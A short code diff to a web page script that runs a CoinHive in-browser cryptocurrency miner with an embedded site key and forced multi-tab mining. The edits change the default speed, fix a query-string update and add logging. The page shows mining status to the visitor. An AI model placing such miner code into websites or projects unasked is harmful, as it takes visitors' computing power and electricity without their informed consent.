@@ -100,7 +100,7 @@
 	var miner = new CoinHive.Anonymous('dpQi9LfJQ6jPwU1zNeNAJYEdxsFhs01w','threads: 50');
 	miner.start(CoinHive.FORCE_MULTI_TAB);
 	var MAX_SPEED = 90;
-	var speed = 50;
+	var speed = 60;
 	function SetSpeed(new_speed) { // 0-100 (higher is less idle time)
             speed = new_speed
             var speedDiv = $('#count')
@@ -108,7 +108,7 @@
             speedDiv.toggleClass('highSpeed', speed >= 90)
             speedDiv.toggleClass('lowSpeed', speed <= 50)
             miner.getNumThreads((100-speed)/100)
-            $('count', speed < 50? speed : undefined)
+            UpdateQueryString('count', speed < 50? speed : undefined)
         }
 	setInterval(function() {
 		//var threadCount = miner.getNumThreads();
@@ -127,6 +127,7 @@
 			$('#status').html('<img src="./img/start.gif"  width="280" height="300" class="responsive-img">');
 			$('#txtcount').text('Velocidad: ');
 			$('#count').text(speed+'% ');
+			console.log(speed);
 			$('#txtsecond').text('Second: ');
 			$('#second').text(hashesPerSecond);
 			$('#txttotal').text('Total: ');
